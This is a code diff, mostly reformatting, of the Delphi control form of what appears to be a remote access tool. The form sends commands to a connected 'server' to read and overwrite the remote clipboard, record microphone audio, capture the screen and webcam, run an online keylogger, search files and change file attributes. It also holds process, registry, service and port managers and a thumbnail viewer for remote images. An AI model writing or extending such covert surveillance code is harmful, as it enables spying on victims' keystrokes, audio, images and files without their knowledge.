-            if AnsiLowerCase(listviewarchivos.items[o].caption) = AnsiLowerCase(Filename) then
+          //calculate name of item from catalog index
+          //for any unknown reason, the name is calculated from index as
+          // inttostr(1. digit) + inttostr(2. digit) + ... (reverse order)
+          IndexStr := '';
+          dwIndex := ThmInfo.dwIndex;
+          while dwIndex > 0 do
             begin
-              if (listviewarchivos.items[o].imageindex <> 3) and (listviewarchivos.items[o].imageindex <> 4) then
-                begin
-                sleep(100);//Si se baja mucho este valor algunas imagenes no cargan, ni idea porque pasa eso...
-                 
-                  bit := tbitmap.create();
-
-                  bit.assign(ThmInfo.jpgThumb);
-                  nbit := tbitmap.create();
-                  bit.pixelformat := pf32bit;
-                  nbit.Width := IconosGrandes.width;
-                  nbit.Height := IconosGrandes.height;
-              
-                                         //centramos la imagen
-                  tmpint := (nbit.height-bit.height) div 2;//"top" de la esquina sup izq
-                  tmpint2 := (nbit.width-bit.width) div 2; //"left" de la esquina sup izq
-                  if tmpint < 0 then tmpint := 0;
-                  if tmpint2 < 0 then tmpint2 := 0;
-
-                  if not ((bit.Width > nbit.Width) or (bit.height > nbit.height)) then
-                    StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, nBit.Width, nBit.Height, Bit.Canvas.Handle, 0, 0,nBit.Width, nBit.Height, SRCCOPY)
-                  else
-                    StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, Bit.Width, Bit.Height, Bit.Canvas.Handle, 0, 0,Bit.Width, Bit.Height, SRCCOPY);
-
-                  nbit.Width := IconosGrandes.width;
-                  nbit.Height := IconosGrandes.height;
-                   t := Imglist.add(nbit,nil);
-                  listviewarchivos.items[o].imageindex := IconosGrandes.count+t;
-                  Estado(_('Cargadas ')+inttostr(t+1)+_(' de ')+inttostr(FCatalogItemCount)+' Miniaturas.');
-                  nbit.free;
-                  bit.free;
-                  bit := nil;
-                  nbit := nil;
-                end;
+              j := dwIndex mod 10;
+              IndexStr := IndexStr + IntToStr(j);
+              dwIndex := dwIndex div 10;
             end;
-           end;
 
+          //read thumbnail as JPEG file
+          ThmInfo.jpgThumb := TJPEGImage.Create;
+          ThumbsDB_JPEG := ThumbsDBFile.OpenStream(IndexStr, STGM_READ or STGM_SHARE_EXCLUSIVE);
+          try
+            //12 bytes in from of JPEG stream
+            ThumbsDB_JPEG.read(ThmInfo.dwUnknown1, 4);
+            ThumbsDB_JPEG.read(ThmInfo.dwUnknown1, 4);
+            ThumbsDB_JPEG.read(ThmInfo.dwSizeOfJPGStream, 4);
 
-        finally
-          ThumbsDB_JPEG.Free;
+            //read stream as JPEG and store in thumb info structure
+            try
+              ThmInfo.jpgThumb.LoadFromStream(ThumbsDB_JPEG);
+            except
+            end;
 
+            for o := 0 to listviewarchivos.Items.Count - 1 do
+              begin
+                if AnsiLowerCase(listviewarchivos.Items[o].Caption) = AnsiLowerCase(FileName) then
+                  begin
+                    if (listviewarchivos.Items[o].imageindex <> 3) and (listviewarchivos.Items[o].imageindex <> 4) then
+                      begin
+                        sleep(100); //Si se baja mucho este valor algunas imagenes no cargan, ni idea porque pasa eso...
+
+                        bit := tbitmap.Create();
+
+                        bit.assign(ThmInfo.jpgThumb);
+                        nbit := tbitmap.Create();
+                        bit.pixelformat := pf32bit;
+                        nbit.Width := IconosGrandes.Width;
+                        nbit.Height := IconosGrandes.Height;
+
+                        //centramos la imagen
+                        tmpint := (nbit.Height - bit.Height) div 2; //"top" de la esquina sup izq
+                        tmpint2 := (nbit.Width - bit.Width) div 2; //"left" de la esquina sup izq
+                        if tmpint < 0 then tmpint := 0;
+                        if tmpint2 < 0 then tmpint2 := 0;
+
+                        if not ((bit.Width > nbit.Width) or (bit.Height > nbit.Height)) then
+                          StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, nBit.Width, nBit.Height, Bit.Canvas.Handle, 0, 0, nBit.Width, nBit.Height, SRCCOPY)
+                        else
+                          StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, Bit.Width, Bit.Height, Bit.Canvas.Handle, 0, 0, Bit.Width, Bit.Height, SRCCOPY);
+
+                        nbit.Width := IconosGrandes.Width;
+                        nbit.Height := IconosGrandes.Height;
+                        t := Imglist.Add(nbit, nil);
+                        listviewarchivos.Items[o].imageindex := IconosGrandes.Count + t;
+                        Estado(_('Cargadas ') + IntToStr(t + 1) + _(' de ') + IntToStr(FCatalogItemCount) + ' Miniaturas.');
+                        nbit.Free;
+                        bit.Free;
+                        bit := nil;
+                        nbit := nil;
+                      end;
+                  end;
+              end;
+
+          finally
+            ThumbsDB_JPEG.Free;
+
+          end;
+          //save structure to list
+          ThumbnailItems.AddObject(AnsiLowerCase(FileName), ThmInfo);
         end;
-        //save structure to list
-        ThumbnailItems.AddObject(AnsiLowerCase(Filename),ThmInfo);
-      end;
     finally
       ThumbsDBCatalog.Free;
     end;
   finally
-    ThumbsDBFile.free;
+    ThumbsDBFile.Free;
   end;
   IconosGrandes.addimages(imglist);
-  listviewarchivos.items.endupdate;
+  listviewarchivos.Items.endupdate;
   Estado(_('Miniaturas cargadas!'));
 end;
-
 
 procedure TFormControl.Abrircarpetadescargas1Click(Sender: TObject);
 begin
   CrearDirectoriosUsuario();
-  ShellExecute(0, 'open', pchar(DirDescargas), '', PChar(DirDescargas), SW_NORMAL);
+  ShellExecute(0, 'open', PChar(DirDescargas), '', PChar(DirDescargas), SW_NORMAL);
 end;
 
 procedure TFormControl.BuscarArchivos1Click(Sender: TObject);
 begin
-  PageControlArchivos.activepage := TabSheetBuscar;
+  PageControlArchivos.ActivePage := TabSheetBuscar;
 end;
 
 procedure TFormControl.ListViewArchivosCustomDrawItem(
   Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
   var DefaultDraw: Boolean);
 begin
-  if item = nil then exit;
-  if item.subitems.count < 3 then exit;
+  if item = nil then Exit;
+  if item.subitems.Count < 3 then Exit;
 
-  if lowercase(item.caption) = 'thumbs.db' then  //archivos de miniatura de imagenes
+  if lowercase(item.Caption) = 'thumbs.db' then //archivos de miniatura de imagenes
     Sender.Canvas.Font.Color := clBlue
-  else
-  if ((pos('Oculto',item.subitems[2]) > 0) or (pos('Sistema',item.subitems[2]) > 0)) then  //Ocultos o Sistema en gris
+  else if ((Pos('Oculto', item.subitems[2]) > 0) or (Pos('Sistema', item.subitems[2]) > 0)) then //Ocultos o Sistema en gris
     Sender.Canvas.Font.Color := clGray;
 
 end;
 
 procedure TFormControl.Oculto2Click(Sender: TObject);
 var
-  CurrentAtrib : string;
+  CurrentAtrib: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    mslistviewitem := ListViewArchivos.Selected;
-    while Assigned(mslistviewitem) do
     begin
-      CurrentAtrib := '';
-      if not (pos(_('Oculto'),mslistviewitem.subitems[2]) > 0) then //cambiamos
-        CurrentAtrib := 'Oculto ';
-      if (pos(_('Sistema'),mslistviewitem.subitems[2]) > 0) then
-        CurrentAtrib := CurrentAtrib+'Sistema ';
-      if (pos(_('Lectura'),mslistviewitem.subitems[2]) > 0) then
-        CurrentAtrib := CurrentAtrib+'Lectura ';
+      mslistviewitem := ListViewArchivos.Selected;
+      while Assigned(mslistviewitem) do
+        begin
+          CurrentAtrib := '';
+          if not (Pos(_('Oculto'), mslistviewitem.subitems[2]) > 0) then //cambiamos
+            CurrentAtrib := 'Oculto ';
+          if (Pos(_('Sistema'), mslistviewitem.subitems[2]) > 0) then
+            CurrentAtrib := CurrentAtrib + 'Sistema ';
+          if (Pos(_('Lectura'), mslistviewitem.subitems[2]) > 0) then
+            CurrentAtrib := CurrentAtrib + 'Lectura ';
 
-      Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
-      mslistviewitem.Caption+'|'+CurrentAtrib+'|');
-      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-    end;
-    btnactualizararchivos.Click;
-  end
+          Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
+            mslistviewitem.Caption + '|' + CurrentAtrib + '|');
+          mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+        end;
+      btnactualizararchivos.Click;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Sistema1Click(Sender: TObject);
 var
-  CurrentAtrib : string;
+  CurrentAtrib: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    mslistviewitem := ListViewArchivos.Selected;
-    while Assigned(mslistviewitem) do
     begin
-      CurrentAtrib := '';
-      if (pos(_('Oculto'),mslistviewitem.subitems[2]) > 0) then //cambiamos
-        CurrentAtrib := 'Oculto ';
-      if not (pos(_('Sistema'),mslistviewitem.subitems[2]) > 0) then
-        CurrentAtrib := CurrentAtrib+'Sistema ';
-      if (pos(_('Lectura'),mslistviewitem.subitems[2]) > 0) then
-        CurrentAtrib := CurrentAtrib+'Lectura ';
+      mslistviewitem := ListViewArchivos.Selected;
+      while Assigned(mslistviewitem) do
+        begin
+          CurrentAtrib := '';
+          if (Pos(_('Oculto'), mslistviewitem.subitems[2]) > 0) then //cambiamos
+            CurrentAtrib := 'Oculto ';
+          if not (Pos(_('Sistema'), mslistviewitem.subitems[2]) > 0) then
+            CurrentAtrib := CurrentAtrib + 'Sistema ';
+          if (Pos(_('Lectura'), mslistviewitem.subitems[2]) > 0) then
+            CurrentAtrib := CurrentAtrib + 'Lectura ';
 
-      Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
-      mslistviewitem.Caption+'|'+CurrentAtrib+'|');
-      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-    end;
-    btnactualizararchivos.Click;
-  end
+          Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
+            mslistviewitem.Caption + '|' + CurrentAtrib + '|');
+          mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+        end;
+      btnactualizararchivos.Click;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Slolectura1Click(Sender: TObject);
 var
-  CurrentAtrib : string;
+  CurrentAtrib: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    mslistviewitem := ListViewArchivos.Selected;
-    while Assigned(mslistviewitem) do
     begin
-      CurrentAtrib := '';
-      if (pos(_('Oculto'),mslistviewitem.subitems[2]) > 0) then //cambiamos
-        CurrentAtrib := 'Oculto ';
-      if (pos(_('Sistema'),mslistviewitem.subitems[2]) > 0) then
-        CurrentAtrib := CurrentAtrib+'Sistema ';
-      if not (pos(_('Lectura'),mslistviewitem.subitems[2]) > 0) then
-        CurrentAtrib := CurrentAtrib+'Lectura ';
+      mslistviewitem := ListViewArchivos.Selected;
+      while Assigned(mslistviewitem) do
+        begin
+          CurrentAtrib := '';
+          if (Pos(_('Oculto'), mslistviewitem.subitems[2]) > 0) then //cambiamos
+            CurrentAtrib := 'Oculto ';
+          if (Pos(_('Sistema'), mslistviewitem.subitems[2]) > 0) then
+            CurrentAtrib := CurrentAtrib + 'Sistema ';
+          if not (Pos(_('Lectura'), mslistviewitem.subitems[2]) > 0) then
+            CurrentAtrib := CurrentAtrib + 'Lectura ';
 
-      Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
-      mslistviewitem.Caption+'|'+CurrentAtrib+'|');
-      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-    end;
-    btnactualizararchivos.Click;
-  end
+          Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
+            mslistviewitem.Caption + '|' + CurrentAtrib + '|');
+          mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+        end;
+      btnactualizararchivos.Click;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.SpeedButtonRutasRapidasClick(Sender: TObject);
 var
-  popupPoint : TPoint;
+  popupPoint: TPoint;
 begin
- popupPoint.X := SpeedButtonRutasRapidas.left;
- popupPoint.Y := SpeedButtonRutasRapidas.top  + (SpeedButtonRutasRapidas.Height DIV 2) ;
- popupPoint := ClientToScreen(popupPoint);
+  popupPoint.X := SpeedButtonRutasRapidas.Left;
+  popupPoint.Y := SpeedButtonRutasRapidas.Top + (SpeedButtonRutasRapidas.Height div 2);
+  popupPoint := ClientToScreen(popupPoint);
 
- PopupRutasRapidas.popup(popupPoint.X, popupPoint.Y) ;
+  PopupRutasRapidas.popup(popupPoint.X, popupPoint.Y);
 end;
 
 procedure TFormControl.Windir1Click(Sender: TObject);
@@ -4380,277 +4418,278 @@ end;
 procedure TFormControl.ComboBoxWebcamKeyPress(Sender: TObject;
   var Key: Char);
 begin
-  Key:= #0;
+  Key := #0;
 end;
 
 procedure TFormControl.ListViewVentanasCustomDrawItem(
   Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
   var DefaultDraw: Boolean);
 begin
-  if item = nil then exit;
-  if item.subitems.count > 0 then
-  if item.subitems[1] = _('Activa') then
-  begin
-    Sender.Canvas.Font.style := [fsbold];
-    Sender.Canvas.Font.Color := clGreen;
-  end;
+  if item = nil then Exit;
+  if item.subitems.Count > 0 then
+    if item.subitems[1] = _('Activa') then
+      begin
+        Sender.Canvas.Font.Style := [fsbold];
+        Sender.Canvas.Font.Color := clGreen;
+      end;
 end;
 
 procedure TFormControl.TabSheetTransferenciasShow(Sender: TObject);
 begin
-  TabSheetTransferencias.Highlighted := false;
+  TabSheetTransferencias.Highlighted := False;
 end;
 
 procedure TFormControl.TabSheetServidorShow(Sender: TObject);
 begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-   BtnActualizarServidorInfo.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+    BtnActualizarServidorInfo.Click;
 end;
 
 procedure TFormControl.TabSheetInfoSistemaShow(Sender: TObject);
 begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-   BtnRefrescarInformacion.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+    BtnRefrescarInformacion.Click;
 end;
 
 procedure TFormControl.TabSheetVerArchivosShow(Sender: TObject);
 begin
-if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-   BtnVerunidades.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+    BtnVerunidades.Click;
 end;
 
 procedure TFormControl.Refrescar1Click(Sender: TObject);
 begin
-if BtnVerRegisto.enabled then
-  BtnVerRegisto.click;
+  if BtnVerRegisto.Enabled then
+    BtnVerRegisto.Click;
 end;
 
 procedure TFormControl.SpeedButtonBuscarClick(Sender: TObject);
 begin
-  if not SpeedButtonBuscar.enabled then exit;
-  
-  if SpeedButtonBuscar.caption = _('Comenzar') then   //comenzar
-  begin
-    Encontrados := 0;
-    TimerCuentaencontrados.enabled := true;
-    ParaDeBuscar := false;
-    ListviewBuscar.Items.count := 0;
-    listviewbuscar.repaint;
-    SpeedButtonBuscar.caption := _('Parar');
-    editbuscar.Enabled := false;
-    TabSheetBuscar.highlighted := true;
-    TabFileManager.highlighted := true;
-    Servidor.Connection.WriteLn('STARTSEARCH|'+editbuscar.text+'|');
-  end
+  if not SpeedButtonBuscar.Enabled then Exit;
+
+  if SpeedButtonBuscar.Caption = _('Comenzar') then //comenzar
+    begin
+      Encontrados := 0;
+      TimerCuentaencontrados.Enabled := True;
+      ParaDeBuscar := False;
+      ListviewBuscar.Items.Count := 0;
+      listviewbuscar.repaint;
+      SpeedButtonBuscar.Caption := _('Parar');
+      editbuscar.Enabled := False;
+      TabSheetBuscar.highlighted := True;
+      TabFileManager.highlighted := True;
+      Servidor.Connection.WriteLn('STARTSEARCH|' + editbuscar.Text + '|');
+    end
   else
-  begin //Parar
-    SpeedButtonBuscar.enabled := false;  //Para evitar que se pulse mas de una vez
-    ParaDeBuscar := true;
-    Servidor.Connection.WriteLn('STOPSEARCH');
-  end;
+    begin //Parar
+      SpeedButtonBuscar.Enabled := False; //Para evitar que se pulse mas de una vez
+      ParaDeBuscar := True;
+      Servidor.Connection.WriteLn('STOPSEARCH');
+    end;
 end;
 
 procedure TFormControl.FormClose(Sender: TObject;
   var Action: TCloseAction);
 begin
 
-  CheckBoxAutoCapturaScreen.checked := false;
-  CheckBoxAutoCamCapture.checked := false;
-  CheckBoxOnlineKeylogger.checked := false;
+  CheckBoxAutoCapturaScreen.Checked := False;
+  CheckBoxAutoCamCapture.Checked := False;
+  CheckBoxOnlineKeylogger.Checked := False;
 end;
 
 procedure TFormControl.ListViewBuscarContextPopup(Sender: TObject;
   MousePos: TPoint; var Handled: Boolean);
 var
-  i : integer;
+  i: Integer;
 begin
-  for i:= 0 to PopupFileManager.items.count-1 do
-  begin
-    PopupFileManager.items[i].visible := false;//Los escondemos todos
-    PopupFileManager.items[i].enabled := false;
-  end;
+  for i := 0 to PopupFileManager.Items.Count - 1 do
+    begin
+      PopupFileManager.Items[i].Visible := False; //Los escondemos todos
+      PopupFileManager.Items[i].Enabled := False;
+    end;
 
   if listviewbuscar.selected <> nil then
-  begin
-    Descargarfichero1.enabled := true; //descargar
-    Agregaracoladedescarga1.enabled := true; //encolar decarga
-    EjecutarAbrir1.enabled := true; //Abrir/ejecutar
-    Eliminar.enabled := true; //Eliminar
-    Previsualizarjpg1.enabled := true;//Visor de imagenes avanzado
-    AbrirCarpetaDescargas2.enabled := true;//abrir directorio descargas
-    Abrirdirectorio1.enabled := true;//Abrir directorio del archivo
-  end
+    begin
+      Descargarfichero1.Enabled := True; //descargar
+      Agregaracoladedescarga1.Enabled := True; //encolar decarga
+      EjecutarAbrir1.Enabled := True; //Abrir/ejecutar
+      Eliminar.Enabled := True; //Eliminar
+      Previsualizarjpg1.Enabled := True; //Visor de imagenes avanzado
+      AbrirCarpetaDescargas2.Enabled := True; //abrir directorio descargas
+      Abrirdirectorio1.Enabled := True; //Abrir directorio del archivo
+    end
   else
-  begin
-    Descargarfichero1.enabled := false; //descargar
-    Agregaracoladedescarga1.enabled := false; //encolar decarga
-    EjecutarAbrir1.enabled := false; //Abrir/ejecutar
-    Eliminar.enabled := false; //Eliminar
-    Previsualizarjpg1.enabled := false;//Visor de imagenes avanzado
-    AbrirCarpetaDescargas2.enabled := true;//abrir directorio descargas
-    Abrirdirectorio1.enabled := false;//Abrir directorio del archivo
-  end;
+    begin
+      Descargarfichero1.Enabled := False; //descargar
+      Agregaracoladedescarga1.Enabled := False; //encolar decarga
+      EjecutarAbrir1.Enabled := False; //Abrir/ejecutar
+      Eliminar.Enabled := False; //Eliminar
+      Previsualizarjpg1.Enabled := False; //Visor de imagenes avanzado
+      AbrirCarpetaDescargas2.Enabled := True; //abrir directorio descargas
+      Abrirdirectorio1.Enabled := False; //Abrir directorio del archivo
+    end;
 
-  Descargarfichero1.visible := true; //descargar
-  Agregaracoladedescarga1.visible := true; //encolar decarga
-  EjecutarAbrir1.visible := true; //Abrir/ejecutar
-  Eliminar.visible := true; //Eliminar
-  Previsualizarjpg1.visible := true;//Visor de imagenes avanzado
-  AbrirCarpetaDescargas2.visible := true;//abrir directorio descargas
-  Abrirdirectorio1.visible := true;//Abrir directorio del archivo
+  Descargarfichero1.Visible := True; //descargar
+  Agregaracoladedescarga1.Visible := True; //encolar decarga
+  EjecutarAbrir1.Visible := True; //Abrir/ejecutar
+  Eliminar.Visible := True; //Eliminar
+  Previsualizarjpg1.Visible := True; //Visor de imagenes avanzado
+  AbrirCarpetaDescargas2.Visible := True; //abrir directorio descargas
+  Abrirdirectorio1.Visible := True; //Abrir directorio del archivo
 
 end;
 
 procedure TFormControl.Abrirdirectorio1Click(Sender: TObject);
 begin
   PageControlArchivos.ActivePage := TabSheetVerArchivos;
-  EditpathArchivos.text := extractfilepath(listviewbuscar.selected.subitems[0]);
-  BtnActualizarArchivos.click;
+  EditpathArchivos.Text := extractfilepath(listviewbuscar.selected.subitems[0]);
+  BtnActualizarArchivos.Click;
 end;
 
 procedure TFormControl.FormShortCut(var Msg: TWMKey; var Handled: Boolean);
 begin
-  if not self.active then exit;
+  if not Self.Active then Exit;
 
   if Msg.charcode = VK_ESCAPE then
-    self.Close;
+    Self.Close;
 
   if Msg.CharCode = VK_F5 then //Refresh!
-  begin
-    if PageControl.activepage = TabInfo then
     begin
-      if PageControlInformacion.ActivePage = TabSheetServidor then
-        BtnActualizarServidorInfo.click
-      else
-        BtnRefrescarInformacion.click;
-    end
-    else if PageControl.activepage = TabFileManager then
-    begin
-      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-        BtnActualizarArchivos.click;
-    end
-    else if PageControl.ActivePage = TabManagers then
-    begin
-      if PageControlManagers.activepage = TabProcesos then
-        BtnRefrescarProcesos.click
-      else if PageControlManagers.activepage = TabVentanas then
-        BtnRefrescarVentanas.click
-      else if PageControlManagers.activepage = TabRegistro then
-        BtnVerRegisto.click
-      else if PageControlManagers.activepage = TabServicios then
-        BtnServicios.click
-      else if PageControlManagers.activepage = TabPuertos then
-        BtnRefrescarPuertos.click;
-    end
-    else if PageControl.ActivePage = TabVigilancia then
-    begin
-      if PageControlVigilancia.activepage = TabScreencap then
-        BtnCapturarScreen.click
-      else if PageControlVigilancia.activepage = TabWebcam then
-        BtnCapturarWebcam.click;
+      if PageControl.ActivePage = TabInfo then
+        begin
+          if PageControlInformacion.ActivePage = TabSheetServidor then
+            BtnActualizarServidorInfo.Click
+          else
+            BtnRefrescarInformacion.Click;
+        end
+      else if PageControl.ActivePage = TabFileManager then
+        begin
+          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+            BtnActualizarArchivos.Click;
+        end
+      else if PageControl.ActivePage = TabManagers then
+        begin
+          if PageControlManagers.ActivePage = TabProcesos then
+            BtnRefrescarProcesos.Click
+          else if PageControlManagers.ActivePage = TabVentanas then
+            BtnRefrescarVentanas.Click
+          else if PageControlManagers.ActivePage = TabRegistro then
+            BtnVerRegisto.Click
+          else if PageControlManagers.ActivePage = TabServicios then
+            BtnServicios.Click
+          else if PageControlManagers.ActivePage = TabPuertos then
+            BtnRefrescarPuertos.Click;
+        end
+      else if PageControl.ActivePage = TabVigilancia then
+        begin
+          if PageControlVigilancia.ActivePage = TabScreencap then
+            BtnCapturarScreen.Click
+          else if PageControlVigilancia.ActivePage = TabWebcam then
+            BtnCapturarWebcam.Click;
+        end;
     end;
-  end;
 end;
 
 procedure TFormControl.TabSheetBuscarShow(Sender: TObject);
 begin
-  if EditBuscar.enabled then
-    EditBuscar.text := EditPathArchivos.text+'*';
+  if EditBuscar.Enabled then
+    EditBuscar.Text := EditPathArchivos.Text + '*';
 
 end;
 
 // Portapapeles!
+
 procedure TFormControl.SpeedButtonClipBoard1Click(Sender: TObject);
 begin
-  if not SpeedButtonClipBoard1.enabled then exit;
-  SpeedButtonClipBoard1.enabled := false;
+  if not SpeedButtonClipBoard1.Enabled then Exit;
+  SpeedButtonClipBoard1.Enabled := False;
   if Servidor.Connection.Connected then
-  begin
-    Servidor.Connection.Writeln('GETCLIP');
-  end
-  else
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-end;
-procedure TFormControl.SpeedButtonClipBoard2Click(Sender: TObject);
-var
-  TempStr : string;
-begin
-  if Servidor.Connection.Connected then
-  begin
-    TempStr := MemoClipBoard.Text;
-    TempStr := StringReplace(Trim(tempstr),#10, '|salto|', [rfReplaceAll]);
-    TempStr := StringReplace((Tempstr),#13, '|salto2|', [rfReplaceAll]);
-    Servidor.Connection.Writeln('SETCLIP|'+ TempStr);
-  end
+    begin
+      Servidor.Connection.Writeln('GETCLIP');
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
+procedure TFormControl.SpeedButtonClipBoard2Click(Sender: TObject);
+var
+  TempStr: string;
+begin
+  if Servidor.Connection.Connected then
+    begin
+      TempStr := MemoClipBoard.Text;
+      TempStr := StringReplace(Trim(tempstr), #10, '|salto|', [rfReplaceAll]);
+      TempStr := StringReplace((Tempstr), #13, '|salto2|', [rfReplaceAll]);
+      Servidor.Connection.Writeln('SETCLIP|' + TempStr);
+    end
+  else
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+end;
 
 procedure TFormControl.TabProcesosShow(Sender: TObject);
 begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-   BtnRefrescarProcesos.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+    BtnRefrescarProcesos.Click;
 end;
 
 procedure TFormControl.FormCloseQuery(Sender: TObject;
   var CanClose: Boolean);
 begin
-  FormMain.ControlWidth := self.Width;
-  FormMain.ControlHeight := self.Height;
+  FormMain.ControlWidth := Self.Width;
+  FormMain.ControlHeight := Self.Height;
 end;
 
 procedure TFormControl.SpeedButtonCapAudioClick(Sender: TObject);
 var
-  formato : string;
-  hz, canal, bits : string;
-  i : integer;
+  formato: string;
+  hz, canal, bits: string;
+  i: Integer;
 begin
-  if not SpeedButtonCapAudio.enabled then exit;
-  
-  for i := 0 to ListViewAudioFormato.items.count-1 do
-    if ListViewAudioFormato.items[i].checked then
-      ListViewAudioFormato.items[i].selected := true;
-  if strtointdef(Spineditaudio.text,-1) = -1 then
-  begin
-    Estado(_('Mínimo 1 segundo'));
-  end;
-  if strtointdef(copy(comboboxaudiodevices.text, 1,1),-1) = -1 then
-  begin
-    Estado(_('Dispositivo de audio no válido'));
-  end
-  else
-  if ListViewAudioFormato.selected = nil then
-  begin
-    Estado(_('Selecciona un formato de audio'));
-  end
-  else
-  begin
-    SpeedbuttoncapAudio.enabled := false;
-    Hz := copy(listviewaudioformato.selected.caption, 1, pos(' ', listviewaudioformato.selected.caption)-1);
+  if not SpeedButtonCapAudio.Enabled then Exit;
 
-    if listviewaudioformato.selected.subitems[0] = 'Mono' then
-      Canal := '1'
-    else
-      Canal := '2';
-      
-    Bits := listviewaudioformato.selected.subitems[1];
-    UltimoFormato := hz+'-'+canal+'-'+bits;
+  for i := 0 to ListViewAudioFormato.Items.Count - 1 do
+    if ListViewAudioFormato.Items[i].Checked then
+      ListViewAudioFormato.Items[i].selected := True;
+  if StrToIntDef(Spineditaudio.Text, -1) = -1 then
+    begin
+      Estado(_('Mínimo 1 segundo'));
+    end;
+  if StrToIntDef(Copy(comboboxaudiodevices.Text, 1, 1), -1) = -1 then
+    begin
+      Estado(_('Dispositivo de audio no válido'));
+    end
+  else if ListViewAudioFormato.selected = nil then
+    begin
+      Estado(_('Selecciona un formato de audio'));
+    end
+  else
+    begin
+      SpeedbuttoncapAudio.Enabled := False;
+      Hz := Copy(listviewaudioformato.selected.Caption, 1, Pos(' ', listviewaudioformato.selected.Caption) - 1);
 
-    Servidor.connection.writeln('GETAUDIO|'+Spineditaudio.text+'|'+hz+'-'+canal+'-'+bits+'|'+copy(comboboxaudiodevices.text, 1,1)+'|');
-  end;
+      if listviewaudioformato.selected.subitems[0] = 'Mono' then
+        Canal := '1'
+      else
+        Canal := '2';
+
+      Bits := listviewaudioformato.selected.subitems[1];
+      UltimoFormato := hz + '-' + canal + '-' + bits;
+
+      Servidor.connection.writeln('GETAUDIO|' + Spineditaudio.Text + '|' + hz + '-' + canal + '-' + bits + '|' + Copy(comboboxaudiodevices.Text, 1, 1) + '|');
+    end;
 end;
 
-  //Pedimos que nos listen los dipositivos de audio disponibles;
-  //Además también nos listan los formatos de audio que admite cada uno de los dispositivos
+//Pedimos que nos listen los dipositivos de audio disponibles;
+//Además también nos listan los formatos de audio que admite cada uno de los dispositivos
+
 procedure TFormControl.SpeedButtonListarAudioClick(Sender: TObject);
 begin
-  if not SpeedButtonListarAudio.enabled then exit;
-  SpeedButtonListarAudio.enabled := false;
+  if not SpeedButtonListarAudio.Enabled then Exit;
+  SpeedButtonListarAudio.Enabled := False;
   if Servidor.Connection.Connected then
-  begin
-   Servidor.connection.writeln('GETADRIVERS');
-  end
+    begin
+      Servidor.connection.writeln('GETADRIVERS');
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -4658,41 +4697,41 @@ end;
 procedure TFormControl.CheckBoxCapturarAudioAutomaticamenteClick(
   Sender: TObject);
 begin
-  if CheckBoxCapturarAudioAutomaticamente.checked then
-  begin
-    SpeedButtonCapAudioClick(nil);
-    TabAudio.highlighted := true;
-  end
+  if CheckBoxCapturarAudioAutomaticamente.Checked then
+    begin
+      SpeedButtonCapAudioClick(nil);
+      TabAudio.highlighted := True;
+    end
   else
-    TabAudio.highlighted := false;
+    TabAudio.highlighted := False;
 end;
 
 procedure TFormControl.PopupAudioPopup(Sender: TObject);
 var
-  status : boolean;
-  i : integer;
+  status: Boolean;
+  i: Integer;
 begin
   if listviewaudio.selected = nil then
-    status := false
+    status := False
   else
-    status := true;
+    status := True;
 
-  for i:=0 to popupaudio.items.count-1 do
-    popupaudio.items[i].enabled := status;
+  for i := 0 to popupaudio.Items.Count - 1 do
+    popupaudio.Items[i].Enabled := status;
 end;
 
 procedure TFormControl.TabAudioShow(Sender: TObject);
 begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) and (ComboboxAudioDevices.text = '') then
-    SpeedButtonListarAudio.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) and (ComboboxAudioDevices.Text = '') then
+    SpeedButtonListarAudio.Click;
 end;
 
-function TFormControl.InitWavFile(var Ms:TMemoryStream;nChannels, nSamplesPerSec, wBitsPerSample:word;b:string):   Integer;
+function TFormControl.InitWavFile(var Ms: TMemoryStream; nChannels, nSamplesPerSec, wBitsPerSample: Word; b: string): Integer;
 var
-    RiffSize : integer;
-    Fmt_Size : integer;
-    WaveBuffLen : integer;
